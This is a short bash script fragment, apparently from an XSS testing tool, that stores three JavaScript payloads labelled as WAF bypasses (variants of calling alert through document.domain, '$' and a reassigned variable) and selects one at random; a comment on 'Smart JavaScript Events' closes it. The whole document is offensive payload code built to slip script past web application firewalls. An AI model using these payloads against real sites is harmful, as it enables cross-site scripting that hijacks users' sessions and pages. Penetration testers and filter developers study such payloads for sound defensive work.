#!/bin/bash
arrBypassWaF[0]="[document.domain].find(alert)"
arrBypassWaF[1]="$=1,alert($)"
arrBypassWaF[2]="x=alert,x(1)"

randBypassWaF=$[ $RANDOM % 3 ]
arrBypassWaF=${arrBypassWaF[$randBypassWaF]}

#Smart JavaScript Events

